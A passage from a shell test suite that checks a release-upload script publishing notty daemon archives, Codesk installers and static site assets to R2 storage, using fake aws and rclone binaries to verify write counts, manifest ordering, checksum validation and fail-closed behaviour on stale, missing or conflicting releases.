	[ "$(wc -c <"$preseed_source" | tr -d ' ')" -eq \
		"$(wc -c <"$preseed_destination" | tr -d ' ')" ] ||
		fail 'stale-object fixture did not preserve payload size'
	! cmp -s "$preseed_source" "$preseed_destination" ||
		fail 'stale-object fixture did not change payload bytes'
}

aws_write_count() {
	aws_write_log="$1"
	aws_write_needle="${2:-}"
	awk -v needle="$aws_write_needle" '
		($4 == "sync" || ($4 == "cp" && $6 ~ /^s3:\/\//)) && index($0, needle) { count++ }
		END { print count + 0 }
	' "$aws_write_log"
}

aws_first_write_line() {
	aws_write_log="$1"
	aws_write_needle="$2"
	awk -v needle="$aws_write_needle" '
		($4 == "sync" || ($4 == "cp" && $6 ~ /^s3:\/\//)) && index($0, needle) { print NR; exit }
	' "$aws_write_log"
}

rclone_write_count() {
	rclone_write_log="$1"
	rclone_write_needle="${2:-}"
	awk -v needle="$rclone_write_needle" '
		(($1 == "copyto" && $3 ~ /^nottyr2:/) || $1 == "sync") && index($0, needle) { count++ }
		END { print count + 0 }
	' "$rclone_write_log"
}

write_daemon_release() {
	daemon_root="$1"
	daemon_version="${2:?write_daemon_release requires a version}"
	daemon_payload="${3:-release}"
	daemon_release_dir="$daemon_root/$daemon_version"
	mkdir -p "$daemon_release_dir"
	: >"$daemon_release_dir/SHA256SUMS"
	printf '{\n  "version": "%s",\n  "artifacts": [\n' "$daemon_version" >"$daemon_release_dir/manifest.json"
	daemon_first=1
	for daemon_spec in \
		'linux amd64 .tar.gz' 'linux arm64 .tar.gz' \
		'darwin amd64 .tar.gz' 'darwin arm64 .tar.gz' \
		'windows amd64 .zip' 'windows arm64 .zip'
	do
		set -- $daemon_spec
		daemon_os="$1"
		daemon_arch="$2"
		daemon_ext="$3"
		daemon_name="notty-daemon_${daemon_version}_${daemon_os}_${daemon_arch}${daemon_ext}"
		printf '%s/%s %s\n' "$daemon_os" "$daemon_arch" "$daemon_payload" >"$daemon_release_dir/$daemon_name"
		daemon_sum="$(fixture_sha256 "$daemon_release_dir/$daemon_name")"
		printf '%s  %s\n' "$daemon_sum" "$daemon_name" >>"$daemon_release_dir/SHA256SUMS"
		if [ "$daemon_first" -eq 0 ]; then printf ',\n' >>"$daemon_release_dir/manifest.json"; fi
		daemon_first=0
		printf '    {"os": "%s", "arch": "%s", "file": "%s", "sha256": "%s"}' \
			"$daemon_os" "$daemon_arch" "$daemon_name" "$daemon_sum" >>"$daemon_release_dir/manifest.json"
	done
	printf '\n  ]\n}\n' >>"$daemon_release_dir/manifest.json"
	for daemon_installer in install.sh uninstall.sh install.ps1 uninstall.ps1; do
		printf '%s\n' "$daemon_installer" >"$daemon_root/$daemon_installer"
	done
}

write_macos_release() {
	macos_root="$1"
	macos_payload="${2:-release}"
	macos_release_dir="$macos_root/$release_version"
	macos_dmg="Codesk_${release_version}_macos_universal.dmg"
	mkdir -p "$macos_release_dir"
	printf 'macOS %s\n' "$macos_payload" >"$macos_release_dir/$macos_dmg"
	macos_hash="$(fixture_sha256 "$macos_release_dir/$macos_dmg")"
	printf '%s  %s\n' "$macos_hash" "$macos_dmg" >"$macos_release_dir/SHA256SUMS"
	printf '{\n  "version": "%s",\n  "artifacts": [\n    {"os": "darwin", "arch": "universal", "file": "%s", "sha256": "%s"}\n  ]\n}\n' \
		"$release_version" "$macos_dmg" "$macos_hash" >"$macos_release_dir/manifest.json"
}

expect_daemon_preflight_failure() {
	failure_label="$1"
	failure_root="$2"
	failure_aws_log="$tmp_dir/$failure_label.aws.log"
	: >"$failure_aws_log"
	if PATH="$fake_bin:$PATH" AWS_LOG="$failure_aws_log" DAEMON_DIST_ROOT="$failure_root" \
		UPLOAD_TARGET=daemon R2_ENDPOINT_URL=https://example.invalid \
		R2_DAEMONS_BUCKET=static R2_DAEMONS_PREFIX=daemons \
		"$repo_dir/scripts/upload-r2.sh" >"$tmp_dir/$failure_label.output" 2>&1; then
		fail "daemon preflight accepted $failure_label"
	fi
	[ ! -s "$failure_aws_log" ] || fail "daemon $failure_label wrote to R2 before failing"
}

write_windows_bundle() {
	bundle_root="$1"
	bundle_arch="$2"
	bundle_head="$3"
	bundle_base="$4"
	bundle_publishable="$5"
	bundle_payload="${6:-release}"
	case "$bundle_arch" in
		amd64) bundle_native=AMD64; bundle_installer=x64 ;;
		arm64) bundle_native=ARM64; bundle_installer=arm64 ;;
		*) fail "unsupported Windows fixture architecture: $bundle_arch" ;;
	esac
	bundle_dir="$bundle_root/$bundle_arch"
	bundle_msi="Codesk_${release_version}_windows_${bundle_arch}.msi"
	mkdir -p "$bundle_dir"
	printf 'msi-%s-%s\n' "$bundle_arch" "$bundle_payload" >"$bundle_dir/$bundle_msi"
	bundle_msi_sha="$(fixture_sha256 "$bundle_dir/$bundle_msi")"
	bundle_msi_size="$(wc -c <"$bundle_dir/$bundle_msi" | tr -d ' ')"
	printf '%s\n' "{\"schemaVersion\":2,\"source\":{\"repository\":\"XIAZY/notty\",\"event\":\"push\",\"checkoutCommit\":\"$bundle_head\",\"sourceHead\":\"$bundle_head\",\"sourceBase\":\"$bundle_base\",\"sourceBaseResolution\":\"event\",\"workflowRef\":\"local/scripts/run-windows-gui-target.ps1@$bundle_head\",\"runId\":\"local\",\"runAttempt\":\"1\"},\"runner\":{\"os\":\"Windows\",\"architecture\":\"$bundle_native\"},\"target\":{\"architecture\":\"$bundle_native\",\"goArchitecture\":\"$bundle_arch\",\"installerPlatform\":\"$bundle_installer\",\"buildMode\":\"release\",\"publishable\":$bundle_publishable},\"packages\":[{\"role\":\"release\",\"version\":\"$release_version\",\"canonicalFile\":\"$bundle_msi\",\"canonicalSha256\":\"$bundle_msi_sha\",\"canonicalSize\":$bundle_msi_size}],\"productCodeDerivation\":{\"algorithm\":\"UUIDv5-SHA1\",\"name\":\"$release_version+$bundle_arch\"}}" >"$bundle_dir/provenance.json"
	bundle_provenance_sha="$(fixture_sha256 "$bundle_dir/provenance.json")"
	printf '%s  %s\r\n%s  provenance.json\r\n' \
		"$bundle_msi_sha" "$bundle_msi" "$bundle_provenance_sha" >"$bundle_dir/SHA256SUMS"
}

write_windows_manifest() {
	windows_manifest_root="$1"
	windows_manifest_path="$2"
	printf '{\n  "version": "%s",\n  "artifacts": [\n' "$release_version" >"$windows_manifest_path"
	windows_manifest_first=1
	for windows_manifest_arch in amd64 arm64; do
		windows_manifest_msi="Codesk_${release_version}_windows_${windows_manifest_arch}.msi"
		windows_manifest_sum="$(fixture_sha256 "$windows_manifest_root/$windows_manifest_arch/$windows_manifest_msi")"
		if [ "$windows_manifest_first" -eq 0 ]; then printf ',\n' >>"$windows_manifest_path"; fi
		windows_manifest_first=0
		printf '    {"os": "windows", "arch": "%s", "file": "%s/%s", "sha256": "%s"}' \
			"$windows_manifest_arch" "$windows_manifest_arch" "$windows_manifest_msi" "$windows_manifest_sum" >>"$windows_manifest_path"
	done
	printf '\n  ]\n}\n' >>"$windows_manifest_path"
}

expect_windows_preflight_failure() {
	failure_label="$1"
	failure_root="$2"
	failure_aws_log="$tmp_dir/$failure_label.aws.log"
	: >"$failure_aws_log"
	if PATH="$fake_bin:$PATH" AWS_LOG="$failure_aws_log" WINDOWS_GUI_MSI_ROOT="$failure_root" \
		UPLOAD_TARGET=windows-gui R2_ENDPOINT_URL=https://example.invalid \
		R2_DESKTOP_BUCKET=static R2_DESKTOP_PREFIX=desktop \
		"$repo_dir/scripts/upload-r2.sh" >"$tmp_dir/$failure_label.output" 2>&1; then
		fail "Windows GUI preflight accepted $failure_label"
	fi
	[ ! -s "$failure_aws_log" ] || fail "Windows GUI $failure_label wrote to R2 before failing"
}

expect_daemon_publication_failure() {
	failure_label="$1"
	failure_root="$2"
	failure_latest="$3"
	failure_ledger="$4"
	failure_aws_log="$tmp_dir/$failure_label.aws.log"
	: >"$failure_aws_log"
	if PATH="$fake_bin:$PATH" AWS_LOG="$failure_aws_log" \
		AWS_REMOTE_LATEST="$failure_latest" AWS_REMOTE_LEDGER="$failure_ledger" \
		DAEMON_DIST_ROOT="$failure_root" UPLOAD_TARGET=daemon \
		R2_ENDPOINT_URL=https://example.invalid R2_DAEMONS_BUCKET=static R2_DAEMONS_PREFIX=daemons \
		"$repo_dir/scripts/upload-r2.sh" >"$tmp_dir/$failure_label.output" 2>&1; then
		fail "daemon publication accepted $failure_label"
	fi
	[ "$(aws_write_count "$failure_aws_log")" -eq 0 ] || fail "daemon $failure_label wrote before failing"
}

expect_macos_publication_failure() {
	failure_label="$1"
	failure_root="$2"
	failure_latest="$3"
	failure_ledger="$4"
	failure_aws_log="$tmp_dir/$failure_label.aws.log"
	: >"$failure_aws_log"
	if PATH="$fake_bin:$PATH" AWS_LOG="$failure_aws_log" \
		AWS_REMOTE_LATEST="$failure_latest" AWS_REMOTE_LEDGER="$failure_ledger" \
		MACOS_GUI_DIST_DIR="$failure_root" UPLOAD_TARGET=macos-gui \
		R2_ENDPOINT_URL=https://example.invalid R2_DESKTOP_BUCKET=static R2_DESKTOP_PREFIX=desktop \
		"$repo_dir/scripts/upload-r2.sh" >"$tmp_dir/$failure_label.output" 2>&1; then
		fail "macOS GUI publication accepted $failure_label"
	fi
	[ "$(aws_write_count "$failure_aws_log")" -eq 0 ] || fail "macOS GUI $failure_label wrote before failing"
}

expect_windows_publication_failure() {
	failure_label="$1"
	failure_root="$2"
	failure_latest="$3"
	failure_ledger="$4"
	failure_aws_log="$tmp_dir/$failure_label.aws.log"
	: >"$failure_aws_log"
	if PATH="$fake_bin:$PATH" AWS_LOG="$failure_aws_log" \
		AWS_REMOTE_LATEST="$failure_latest" AWS_REMOTE_LEDGER="$failure_ledger" \
		WINDOWS_GUI_MSI_ROOT="$failure_root" UPLOAD_TARGET=windows-gui \
		R2_ENDPOINT_URL=https://example.invalid R2_DESKTOP_BUCKET=static R2_DESKTOP_PREFIX=desktop \
		"$repo_dir/scripts/upload-r2.sh" >"$tmp_dir/$failure_label.output" 2>&1; then
		fail "Windows GUI publication accepted $failure_label"
	fi
	[ "$(aws_write_count "$failure_aws_log")" -eq 0 ] || fail "Windows GUI $failure_label wrote before failing"
}

static_dist="$tmp_dir/static"
mkdir -p "$static_dist/homepage" "$static_dist/app"
printf '<html>home</html>\n' >"$static_dist/homepage/index.html"
printf '<html>app</html>\n' >"$static_dist/app/index.html"
for browser_asset in \
	favicon.svg favicon.ico favicon-32x32.png favicon-16x16.png \
	apple-touch-icon.png safari-pinned-tab.svg
do
	printf '%s\n' "$browser_asset" >"$static_dist/homepage/$browser_asset"
	printf '%s\n' "$browser_asset" >"$static_dist/app/$browser_asset"
done
PATH="$fake_bin:$PATH" AWS_LOG="$aws_log" STATIC_DIST_DIR="$static_dist" UPLOAD_TARGET=frontend \
	R2_ENDPOINT_URL=https://example.invalid R2_HOMEPAGE_BUCKET=homepage R2_APP_BUCKET=app \
	"$repo_dir/scripts/upload-r2.sh" >/dev/null
for browser_asset in \
	favicon.svg favicon.ico favicon-32x32.png favicon-16x16.png \
	apple-touch-icon.png safari-pinned-tab.svg
do
	for browser_bucket in homepage app; do
		browser_uri="s3://$browser_bucket/$browser_asset"
		[ "$(aws_write_count "$aws_log" "$browser_uri")" -eq 1 ] ||
			fail "$browser_uri was not explicitly uploaded exactly once"
		grep -F "$browser_uri" "$aws_log" | grep -Fq -- '--cache-control public, max-age=300' ||
			fail "$browser_uri did not receive the short browser-shell cache policy"
	done
done
grep -F 's3://homepage/favicon.ico' "$aws_log" | grep -Fq -- '--content-type image/x-icon' ||
	fail 'homepage favicon.ico did not receive an icon content type'
grep -F 's3://app/favicon.ico' "$aws_log" | grep -Fq -- '--content-type image/x-icon' ||
	fail 'app favicon.ico did not receive an icon content type'
pass 'browser icons are explicitly uploaded with compatible metadata and short caching'

daemon_dist="$tmp_dir/daemons"
write_daemon_release "$daemon_dist" "$release_version"
daemon_release_dir="$daemon_dist/$release_version"
BSD_FIND_REAL="$bsd_find_real" BSD_SORT_REAL="$bsd_sort_real" PATH="$bsd_find_bin:$fake_bin:$PATH" \
	AWS_LOG="$aws_log" DAEMON_DIST_ROOT="$daemon_dist" \
	UPLOAD_TARGET=daemon R2_ENDPOINT_URL=https://example.invalid \
	R2_DAEMONS_BUCKET=static R2_DAEMONS_PREFIX=daemons \
	"$repo_dir/scripts/upload-r2.sh" >/dev/null
pass 'daemon upload inventory is portable when find rejects GNU -printf'

daemon_version_uri="s3://static/daemons/$release_version/"
daemon_ledger_uri="${daemon_version_uri}manifest.json"
daemon_latest_uri='s3://static/daemons/latest/manifest.json'
[ "$(aws_write_count "$aws_log" "$daemon_version_uri")" -eq 8 ] ||
	fail 'daemon deploy did not write version payloads and their ledger exactly once each'
[ "$(aws_write_count "$aws_log" "$daemon_latest_uri")" -eq 1 ] ||
	fail 'daemon deploy did not write latest exactly once'
daemon_ledger_line="$(aws_first_write_line "$aws_log" "$daemon_ledger_uri")"
daemon_latest_line="$(aws_first_write_line "$aws_log" "$daemon_latest_uri")"
for daemon_payload_name in \
	SHA256SUMS \
	"notty-daemon_${release_version}_linux_amd64.tar.gz" \
	"notty-daemon_${release_version}_linux_arm64.tar.gz" \
	"notty-daemon_${release_version}_darwin_amd64.tar.gz" \
	"notty-daemon_${release_version}_darwin_arm64.tar.gz" \
	"notty-daemon_${release_version}_windows_amd64.zip" \
	"notty-daemon_${release_version}_windows_arm64.zip"
do
	daemon_payload_uri="$daemon_version_uri$daemon_payload_name"
	[ "$(aws_write_count "$aws_log" "$daemon_payload_uri")" -eq 1 ] ||
		fail "daemon payload was not put exactly once: $daemon_payload_name"
	daemon_payload_line="$(aws_first_write_line "$aws_log" "$daemon_payload_uri")"
	[ "$daemon_payload_line" -lt "$daemon_ledger_line" ] ||
		fail "daemon version ledger preceded payload publication: $daemon_payload_name"
done
for daemon_stable_installer in install.sh uninstall.sh install.ps1 uninstall.ps1; do
	daemon_installer_uri="s3://static/daemons/$daemon_stable_installer"
	[ "$(aws_write_count "$aws_log" "$daemon_installer_uri")" -eq 1 ] ||
		fail "daemon deploy did not write $daemon_stable_installer exactly once"
	daemon_installer_line="$(aws_first_write_line "$aws_log" "$daemon_installer_uri")"
	[ "$daemon_ledger_line" -lt "$daemon_installer_line" ] && [ "$daemon_installer_line" -lt "$daemon_latest_line" ] ||
		fail "daemon $daemon_stable_installer write was outside the pre-commit window"
done
pass 'daemon version ledger commits after payloads and latest commits after stable installers'

daemon_retry_store="$tmp_dir/daemon-retry-store"
daemon_retry_log="$tmp_dir/daemon-retry.aws.log"
daemon_retry_assert_log="$tmp_dir/daemon-retry-ledger-assert.log"
daemon_retry_payload_name="notty-daemon_${release_version}_linux_amd64.tar.gz"
daemon_retry_payload_source="$daemon_release_dir/$daemon_retry_payload_name"
daemon_retry_payload_uri="$daemon_version_uri$daemon_retry_payload_name"
daemon_retry_payload_store="$daemon_retry_store/${daemon_retry_payload_uri#s3://}"
preseed_equal_size_mismatch "$daemon_retry_payload_source" "$daemon_retry_payload_store"
: >"$daemon_retry_log"
: >"$daemon_retry_assert_log"
PATH="$fake_bin:$PATH" AWS_LOG="$daemon_retry_log" AWS_OBJECT_STORE_DIR="$daemon_retry_store" \
	AWS_LEDGER_ASSERT_COMMIT_URI="$daemon_ledger_uri" \
	AWS_LEDGER_ASSERT_PAYLOAD_URI="$daemon_retry_payload_uri" \
	AWS_LEDGER_ASSERT_PAYLOAD_SOURCE="$daemon_retry_payload_source" \
	AWS_LEDGER_ASSERT_LOG="$daemon_retry_assert_log" \
	DAEMON_DIST_ROOT="$daemon_dist" UPLOAD_TARGET=daemon \
	R2_ENDPOINT_URL=https://example.invalid R2_DAEMONS_BUCKET=static R2_DAEMONS_PREFIX=daemons \
	"$repo_dir/scripts/upload-r2.sh" >/dev/null
cmp -s "$daemon_retry_payload_source" "$daemon_retry_payload_store" ||
	fail 'daemon retry did not replace an equal-sized stale payload'
[ "$(cat "$daemon_retry_assert_log")" = "$daemon_ledger_uri" ] ||
	fail 'daemon retry did not verify payload bytes before committing the ledger'
[ -f "$daemon_retry_store/${daemon_ledger_uri#s3://}" ] ||
	fail 'daemon retry did not commit the version ledger after payload replacement'
pass 'daemon retry unconditionally replaces stale equal-sized payloads before ledger commit'

daemon_find_failure_log="$tmp_dir/daemon-release-find-failure.rclone.log"
: >"$daemon_find_failure_log"
if BSD_FIND_REAL="$bsd_find_real" BSD_SORT_REAL="$bsd_sort_real" \
	FAIL_COMMITTED_FIND=1 FAIL_COMMITTED_FIND_BASENAME=release \
	PATH="$bsd_find_bin:$fake_bin:$PATH" RCLONE_LOG="$daemon_find_failure_log" \
	DAEMON_DIST_ROOT="$daemon_dist" UPLOAD_TARGET=daemon \
	R2_ENDPOINT_URL=https://example.invalid \
	R2_DAEMONS_BUCKET=static R2_DAEMONS_PREFIX=daemons \
	"$repo_dir/scripts/upload-r2.sh" >"$tmp_dir/daemon-release-find-failure.output" 2>&1; then
	fail 'rclone daemon deploy masked immutable payload enumeration failure'
fi
[ "$(rclone_write_count "$daemon_find_failure_log")" -eq 0 ] ||
	fail 'rclone daemon payload enumeration failure allowed an R2 write'

daemon_sort_failure_log="$tmp_dir/daemon-release-sort-failure.rclone.log"
: >"$daemon_sort_failure_log"
if BSD_FIND_REAL="$bsd_find_real" BSD_SORT_REAL="$bsd_sort_real" FAIL_COMMITTED_SORT=1 \
	PATH="$bsd_find_bin:$fake_bin:$PATH" RCLONE_LOG="$daemon_sort_failure_log" \
	DAEMON_DIST_ROOT="$daemon_dist" UPLOAD_TARGET=daemon \
	R2_ENDPOINT_URL=https://example.invalid \
	R2_DAEMONS_BUCKET=static R2_DAEMONS_PREFIX=daemons \
	"$repo_dir/scripts/upload-r2.sh" >"$tmp_dir/daemon-release-sort-failure.output" 2>&1; then
	fail 'rclone daemon deploy masked immutable payload ordering failure'
fi
[ "$(rclone_write_count "$daemon_sort_failure_log")" -eq 0 ] ||
	fail 'rclone daemon payload ordering failure allowed an R2 write'

daemon_rclone_payload_failure_log="$tmp_dir/daemon-payload-put-failure.rclone.log"
daemon_rclone_payload_failure_key="static/daemons/$release_version/notty-daemon_${release_version}_linux_arm64.tar.gz"
: >"$daemon_rclone_payload_failure_log"
if PATH="$fake_bin:$PATH" RCLONE_LOG="$daemon_rclone_payload_failure_log" \
	RCLONE_FAIL_PAYLOAD_KEY="$daemon_rclone_payload_failure_key" \
	DAEMON_DIST_ROOT="$daemon_dist" UPLOAD_TARGET=daemon \
	R2_ENDPOINT_URL=https://example.invalid \
	R2_DAEMONS_BUCKET=static R2_DAEMONS_PREFIX=daemons \
	"$repo_dir/scripts/upload-r2.sh" >"$tmp_dir/daemon-payload-put-failure.output" 2>&1; then
	fail 'rclone daemon deploy swallowed an immutable payload upload failure'
fi
[ "$(rclone_write_count "$daemon_rclone_payload_failure_log" "nottyr2:static/daemons/$release_version/")" -gt 0 ] ||
	fail 'rclone daemon payload failure hook did not run mid-loop'
[ "$(rclone_write_count "$daemon_rclone_payload_failure_log" "nottyr2:static/daemons/$release_version/manifest.json")" -eq 0 ] ||
	fail 'rclone daemon payload failure allowed the version ledger commit'
[ "$(rclone_write_count "$daemon_rclone_payload_failure_log" 'nottyr2:static/daemons/latest/manifest.json')" -eq 0 ] ||
	fail 'rclone daemon payload failure allowed the latest commit'
pass 'rclone daemon discovery and payload failures cannot reach a commit upload'

daemon_missing_dist="$tmp_dir/daemon-missing-archive"
cp -R "$daemon_dist" "$daemon_missing_dist"
rm "$daemon_missing_dist/$release_version/notty-daemon_${release_version}_windows_arm64.zip"
expect_daemon_preflight_failure missing-archive "$daemon_missing_dist"

daemon_extra_dist="$tmp_dir/daemon-extra-archive"
cp -R "$daemon_dist" "$daemon_extra_dist"
printf 'stale\n' >"$daemon_extra_dist/$release_version/notty-daemon_${release_version}_linux_386.tar.gz"
expect_daemon_preflight_failure stale-extra-archive "$daemon_extra_dist"

daemon_partial_manifest_dist="$tmp_dir/daemon-partial-manifest"
cp -R "$daemon_dist" "$daemon_partial_manifest_dist"
printf '{"version":"%s","artifacts":[]}\n' "$release_version" \
	>"$daemon_partial_manifest_dist/$release_version/manifest.json"
expect_daemon_preflight_failure partial-manifest "$daemon_partial_manifest_dist"

daemon_wrong_checksum_dist="$tmp_dir/daemon-wrong-checksum"
cp -R "$daemon_dist" "$daemon_wrong_checksum_dist"
daemon_zero_hash="$(printf '%064d' 0)"
awk -v zero="$daemon_zero_hash" 'NR == 1 { $1 = zero } { print $1 "  " $2 }' \
	"$daemon_wrong_checksum_dist/$release_version/SHA256SUMS" >"$daemon_wrong_checksum_dist/SHA256SUMS.new"
mv "$daemon_wrong_checksum_dist/SHA256SUMS.new" \
	"$daemon_wrong_checksum_dist/$release_version/SHA256SUMS"
expect_daemon_preflight_failure wrong-checksum "$daemon_wrong_checksum_dist"
pass 'daemon upload rejects missing, stale, partial-manifest, and checksum inputs before any R2 write'

daemon_remote_latest="$daemon_release_dir/manifest.json"
daemon_noop_log="$tmp_dir/daemon-identical-redeploy.aws.log"
: >"$daemon_noop_log"
PATH="$fake_bin:$PATH" AWS_LOG="$daemon_noop_log" AWS_REMOTE_LATEST="$daemon_remote_latest" \
	AWS_REMOTE_LEDGER="$daemon_remote_latest" \
	DAEMON_DIST_ROOT="$daemon_dist" UPLOAD_TARGET=daemon \
	R2_ENDPOINT_URL=https://example.invalid R2_DAEMONS_BUCKET=static R2_DAEMONS_PREFIX=daemons \
	"$repo_dir/scripts/upload-r2.sh" >"$tmp_dir/daemon-identical-redeploy.output"
[ "$(aws_write_count "$daemon_noop_log")" -eq 0 ] || fail 'identical daemon redeploy was not a zero-write no-op'
grep -Fq 'already published; no writes needed' "$tmp_dir/daemon-identical-redeploy.output" ||
	fail 'identical daemon redeploy did not report the no-op'

daemon_conflict_dist="$tmp_dir/daemon-same-version-conflict"
write_daemon_release "$daemon_conflict_dist" "$release_version" changed
daemon_conflict_log="$tmp_dir/daemon-same-version-conflict.aws.log"
: >"$daemon_conflict_log"
PATH="$fake_bin:$PATH" AWS_LOG="$daemon_conflict_log" AWS_REMOTE_LATEST="$daemon_remote_latest" \
	AWS_REMOTE_LEDGER="$daemon_remote_latest" \
	DAEMON_DIST_ROOT="$daemon_conflict_dist" UPLOAD_TARGET=daemon \
	R2_ENDPOINT_URL=https://example.invalid R2_DAEMONS_BUCKET=static R2_DAEMONS_PREFIX=daemons \
	"$repo_dir/scripts/upload-r2.sh" >"$tmp_dir/daemon-same-version-conflict.output"
[ "$(aws_write_count "$daemon_conflict_log" "$daemon_version_uri")" -eq 8 ] ||
	fail 'same-version daemon replacement did not rewrite every version object'
[ "$(aws_write_count "$daemon_conflict_log" "$daemon_latest_uri")" -eq 1 ] ||
	fail 'same-version daemon replacement did not commit latest exactly once'
grep -Fq "Replacing daemon release $release_version" "$tmp_dir/daemon-same-version-conflict.output" ||
	fail 'same-version daemon replacement did not report replacement mode'
grep -F "$daemon_version_uri" "$daemon_conflict_log" | grep -Fq -- '--cache-control public, max-age=60' ||
	fail 'replaceable daemon version objects retained immutable cache metadata'
daemon_conflict_ledger_line="$(aws_first_write_line "$daemon_conflict_log" "$daemon_ledger_uri")"
daemon_conflict_latest_line="$(aws_first_write_line "$daemon_conflict_log" "$daemon_latest_uri")"
for daemon_conflict_payload_name in \
	SHA256SUMS \
	"notty-daemon_${release_version}_linux_amd64.tar.gz" \
	"notty-daemon_${release_version}_linux_arm64.tar.gz" \
	"notty-daemon_${release_version}_darwin_amd64.tar.gz" \
	"notty-daemon_${release_version}_darwin_arm64.tar.gz" \
	"notty-daemon_${release_version}_windows_amd64.zip" \
	"notty-daemon_${release_version}_windows_arm64.zip"
do
	daemon_conflict_payload_line="$(aws_first_write_line "$daemon_conflict_log" "$daemon_version_uri$daemon_conflict_payload_name")"
	[ "$daemon_conflict_payload_line" -lt "$daemon_conflict_ledger_line" ] ||
		fail "same-version daemon replacement committed its ledger before $daemon_conflict_payload_name"
done
[ "$daemon_conflict_ledger_line" -lt "$daemon_conflict_latest_line" ] ||
	fail 'same-version daemon replacement committed latest before its version ledger'

pass 'same-version daemon rebuild replaces R2 payloads and commits manifests in order'

daemon_older_dist="$tmp_dir/daemon-older-release"
write_daemon_release "$daemon_older_dist" "$daemon_older_version" old
daemon_older_latest="$daemon_older_dist/$daemon_older_version/manifest.json"
daemon_newer_dist="$tmp_dir/daemon-newer-release"
write_daemon_release "$daemon_newer_dist" "$daemon_newer_version" newer
daemon_newer_latest="$daemon_newer_dist/$daemon_newer_version/manifest.json"
daemon_new_version_log="$tmp_dir/daemon-new-version.aws.log"
: >"$daemon_new_version_log"
PATH="$fake_bin:$PATH" AWS_LOG="$daemon_new_version_log" \
	AWS_REMOTE_LATEST="$daemon_older_latest" DAEMON_DIST_ROOT="$daemon_dist" \
	UPLOAD_TARGET=daemon R2_ENDPOINT_URL=https://example.invalid \
	R2_DAEMONS_BUCKET=static R2_DAEMONS_PREFIX=daemons \
	"$repo_dir/scripts/upload-r2.sh" >/dev/null
[ "$(aws_write_count "$daemon_new_version_log" "$daemon_version_uri")" -eq 8 ] ||
	fail 'fresh forward daemon publish did not write payloads and ledger'
[ "$(aws_write_count "$daemon_new_version_log" "$daemon_latest_uri")" -eq 1 ] ||
	fail 'daemon deploy did not publish when latest named a different version'

daemon_forward_completion_log="$tmp_dir/daemon-forward-completion.aws.log"
: >"$daemon_forward_completion_log"
PATH="$fake_bin:$PATH" AWS_LOG="$daemon_forward_completion_log" \
	AWS_REMOTE_LATEST="$daemon_older_latest" AWS_REMOTE_LEDGER="$daemon_remote_latest" \
	DAEMON_DIST_ROOT="$daemon_dist" UPLOAD_TARGET=daemon \
	R2_ENDPOINT_URL=https://example.invalid R2_DAEMONS_BUCKET=static R2_DAEMONS_PREFIX=daemons \
	"$repo_dir/scripts/upload-r2.sh" >/dev/null
[ "$(aws_write_count "$daemon_forward_completion_log" "$daemon_version_uri")" -eq 0 ] ||
	fail 'daemon forward completion rewrote immutable version bytes'
for daemon_stable_installer in install.sh uninstall.sh install.ps1 uninstall.ps1; do
	[ "$(aws_write_count "$daemon_forward_completion_log" "s3://static/daemons/$daemon_stable_installer")" -eq 1 ] ||
		fail "daemon forward completion did not refresh $daemon_stable_installer"
done
[ "$(aws_write_count "$daemon_forward_completion_log" "$daemon_latest_uri")" -eq 1 ] ||
	fail 'daemon forward completion did not advance latest exactly once'

daemon_missing_pointer_completion_log="$tmp_dir/daemon-missing-pointer-completion.aws.log"
: >"$daemon_missing_pointer_completion_log"
PATH="$fake_bin:$PATH" AWS_LOG="$daemon_missing_pointer_completion_log" \
	AWS_REMOTE_LEDGER="$daemon_remote_latest" DAEMON_DIST_ROOT="$daemon_dist" \
	UPLOAD_TARGET=daemon R2_ENDPOINT_URL=https://example.invalid \
	R2_DAEMONS_BUCKET=static R2_DAEMONS_PREFIX=daemons \
	"$repo_dir/scripts/upload-r2.sh" >/dev/null
[ "$(aws_write_count "$daemon_missing_pointer_completion_log" "$daemon_version_uri")" -eq 0 ] ||
	fail 'daemon missing-pointer completion rewrote immutable version bytes'
[ "$(aws_write_count "$daemon_missing_pointer_completion_log" "$daemon_latest_uri")" -eq 1 ] ||
	fail 'daemon missing-pointer completion did not advance latest exactly once'

daemon_malformed_latest="$tmp_dir/daemon-malformed-latest.json"
printf '{"version":"%s"}\n' "$daemon_older_version" >"$daemon_malformed_latest"
expect_daemon_publication_failure daemon-malformed-latest "$daemon_dist" "$daemon_malformed_latest" ''
daemon_ambiguous_latest="$tmp_dir/daemon-ambiguous-latest.json"
printf '{\n  "version": "%s",\n  "duplicate": {"version": "%s"}\n}\n' \
	"$daemon_older_version" "$daemon_older_version" >"$daemon_ambiguous_latest"
expect_daemon_publication_failure daemon-ambiguous-latest "$daemon_dist" "$daemon_ambiguous_latest" ''
expect_daemon_publication_failure daemon-missing-ledger-current "$daemon_dist" "$daemon_remote_latest" ''
expect_daemon_publication_failure daemon-downgrade-missing-ledger "$daemon_dist" "$daemon_newer_latest" ''
expect_daemon_publication_failure daemon-downgrade-identical-ledger \
	"$daemon_dist" "$daemon_newer_latest" "$daemon_remote_latest"
expect_daemon_publication_failure daemon-pointer-conflict \
	"$daemon_dist" "$daemon_conflict_dist/$release_version/manifest.json" "$daemon_remote_latest"
expect_daemon_publication_failure daemon-historical-rewrite \
	"$daemon_conflict_dist" "$daemon_older_latest" "$daemon_remote_latest"
pass 'daemon ledger/pointer matrix preserves fresh publish, no-op, current replacement, forward completion, and fail-closed historical states'

daemon_read_failure_log="$tmp_dir/daemon-latest-read-failure.aws.log"
: >"$daemon_read_failure_log"
if PATH="$fake_bin:$PATH" AWS_LOG="$daemon_read_failure_log" AWS_FAIL_LATEST_READ=1 \
	DAEMON_DIST_ROOT="$daemon_dist" UPLOAD_TARGET=daemon \
	R2_ENDPOINT_URL=https://example.invalid R2_DAEMONS_BUCKET=static R2_DAEMONS_PREFIX=daemons \
	"$repo_dir/scripts/upload-r2.sh" >"$tmp_dir/daemon-latest-read-failure.output" 2>&1; then
	fail 'daemon deploy treated a latest read failure as an unpublished release'
fi
[ "$(aws_write_count "$daemon_read_failure_log")" -eq 0 ] || fail 'daemon latest read failure allowed writes'

daemon_payload_failure_log="$tmp_dir/daemon-version-payload-failure.aws.log"
: >"$daemon_payload_failure_log"
if PATH="$fake_bin:$PATH" AWS_LOG="$daemon_payload_failure_log" AWS_FAIL_VERSION_PAYLOAD=1 \
	DAEMON_DIST_ROOT="$daemon_dist" UPLOAD_TARGET=daemon \
	R2_ENDPOINT_URL=https://example.invalid R2_DAEMONS_BUCKET=static R2_DAEMONS_PREFIX=daemons \
	"$repo_dir/scripts/upload-r2.sh" >"$tmp_dir/daemon-version-payload-failure.output" 2>&1; then
	fail 'daemon deploy swallowed an immutable payload PUT failure'
fi
